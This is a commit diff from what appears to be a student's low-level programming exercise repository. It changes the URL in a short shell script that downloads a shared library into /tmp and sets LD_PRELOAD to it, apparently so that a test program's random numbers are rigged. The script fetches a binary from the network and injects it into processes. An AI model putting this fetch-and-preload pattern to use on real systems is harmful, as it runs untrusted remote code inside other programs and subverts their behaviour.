6a075e520d40ae49893e1b0be7c56855c5f399d0
wingmann <ema_eno@zoho.com>
2023-01-17 06:43:18 +0100

    fix wget path

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://raw.github.com/Timex19/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+wget -P /tmp/ https://raw.github.com/wingmann9/alx-low_level_programming/main/0x18-dynamic_libraries/nrandom.so
 export LD_PRELOAD=/tmp/nrandom.so
